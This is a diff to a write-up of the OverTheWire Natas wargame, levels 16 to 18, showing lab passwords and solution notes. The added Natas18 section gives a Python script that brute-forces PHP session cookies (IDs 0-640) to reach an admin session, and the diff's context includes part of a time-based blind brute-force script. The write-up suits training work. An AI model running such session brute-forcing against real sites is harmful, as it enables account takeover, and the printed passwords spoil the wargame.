@@ -401,8 +401,8 @@ username: natas16
 password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh 
 ```
 
-**[Natas17](http://natas17.natas.labs.overthewire.org)**  
-It's same Natas16 but have filter
+**[Natas16](http://natas16.natas.labs.overthewire.org)**  
+It's same Natas15 but have filter
 ```php
 if(preg_match('/[;|&`\'"]/',$key)) {
         print "Input contains an illegal character!";
@@ -438,8 +438,8 @@ username: natas17
 password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw 
 ```
 
-**[Natas18](http://natas18.natas.labs.overthewire.org)**  
-It's same Natas16 and Natas17 but nothing echo for us,
+**[Natas17](http://natas17.natas.labs.overthewire.org)**  
+It's same Natas15 and Natas16 but nothing echo for us,
 We can brute force password by using Time-based attack
 ```python
 import requests
@@ -470,4 +470,36 @@ for i in range(32):
 ```
 username: natas18
 password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP 
+```
+
+**[Natas18](http://natas18.natas.labs.overthewire.org)**  
+View source code, there are some functions, we will get the flag if the session admin is 1. Let see how we can effect session admin.  
+<i>print_credentials</i> function just print information, less care about that.  
+<i>isValidAdminLogin</i> function is less care too, because it always returns 0.  
+So we check my_session_start function, createID, and isValidID. We see it create a session with id between 0 and 640.
+```php
+$maxid = 640; // 640 should be enough for everyone
+```
+So there is some cookie value that make
+```php
+$_SESSION["admin"] = 1;
+```
+Brute force it
+```python
+import requests
+import string
+
+url = 'http://natas18.natas.labs.overthewire.org/'
+auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+for i in range(640):
+    cookies = {'PHPSESSID': str(i)}
+    x = requests.post(url, auth=(auth), cookies=cookies)
+    print(i)
+    if ('You are an admin.' in x.text):
+        print(x.text)
+        break
+```
+```
+username: natas19
+password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs 
 ```
